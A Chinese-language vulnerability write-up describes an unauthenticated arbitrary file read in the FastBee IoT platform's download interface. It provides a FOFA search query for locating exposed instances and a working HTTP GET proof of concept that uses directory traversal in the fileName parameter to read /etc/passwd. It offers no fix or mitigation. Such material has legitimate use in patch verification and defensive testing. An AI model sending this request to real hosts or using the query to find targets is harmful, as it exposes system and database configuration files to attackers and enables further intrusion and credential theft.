## 蜂信物联(FastBee)物联网平台任意文件读取漏洞

## 一、漏洞简介
FastBee是一个简单易用的开源物联网平台,更适合中小企业和个人快速学习和搭建设备联网平台。可用于智能家居、智慧办公、智慧社区、农业监测、水利监测、工业控制等领域。蜂信物联 FastBee 开源物联网平台 download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件），导致网站处于极度不安全状态。

## fofa
```
body="FastBee物联网系统" || icon_hash="-307138793"
```

## POC
```
GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1Host: xxx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```
